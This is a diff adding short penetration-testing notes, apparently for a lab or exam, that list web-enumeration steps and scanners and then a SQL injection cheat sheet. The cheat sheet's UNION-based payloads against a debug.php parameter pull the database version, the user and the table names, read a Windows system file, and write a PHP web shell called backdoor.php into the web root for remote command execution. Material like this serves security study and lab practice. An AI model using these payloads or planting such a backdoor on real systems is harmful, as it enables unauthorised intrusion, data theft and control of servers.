@@ -1,0 +1,61 @@
+Manual
+    - Inspect URLs
+    - Inspect page content
+    - View Response headers (Burp or browser)
+    - Wappalyzer
+    - inspect site maps (robots.txt...)
+    - Research app on web and find admin console/logins, configuration ideas, security notices...
+    
+Tools
+    - Dirb
+    - Gobuster
+    - WPScan
+    - Nikto
+    - Burpsuite
+
+
+
+
+SQL:
+
+Get information about the DB version:
+http://10.11.0.22/debug.php?id=1 union all select 1, 2, @@version
+
+What user is currently on the DB
+http://10.11.0.22/debug.php?id=1 union all select 1, 2, user()
+
+Get more information about the tables in the db:
+http://10.11.0.22/debug.php?id=1 union all select 1, 2, table_name from information_schema.tables
+
+Read a file in using the query.
+http://10.11.0.22/debug.php?id=1 union all select 1, 2, load_file('C:/Windows/System32/drivers/etc/hosts')
+
+Write a simple, malicious shell script in php out to the web directory:
+http://10.11.0.22/debug.php?id=1 union all select 1, 2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE 'c:/xampp/htdocs/backdoor.php'
+-call using the backdoor.php?cmd= 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
